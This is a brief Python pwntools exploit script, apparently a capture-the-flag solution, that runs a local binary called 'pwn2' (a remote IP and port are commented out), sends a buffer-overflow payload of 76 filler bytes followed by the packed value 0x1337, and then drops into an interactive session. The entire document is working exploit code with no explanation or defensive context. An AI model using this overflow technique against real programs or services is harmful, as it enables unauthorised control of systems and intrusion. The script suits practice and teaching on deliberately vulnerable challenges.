from pwn import *

p = process('./pwn2')
#p = remote('3.1.32.51', 8010)

payload = b'A'*76
payload += p64(0x1337)

p.sendline(payload)

p.interactive()
